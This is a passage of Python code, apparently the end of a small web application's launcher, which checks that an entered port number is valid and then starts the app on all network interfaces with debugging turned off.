            if port < 1 or port > 65535:
                print("Port must be between 1 and 65535."); continue
            break
        except ValueError:
            print("Invalid input. Enter a valid port number.")

    _print_startup(port)
    app.run(host="0.0.0.0", port=port, debug=False)
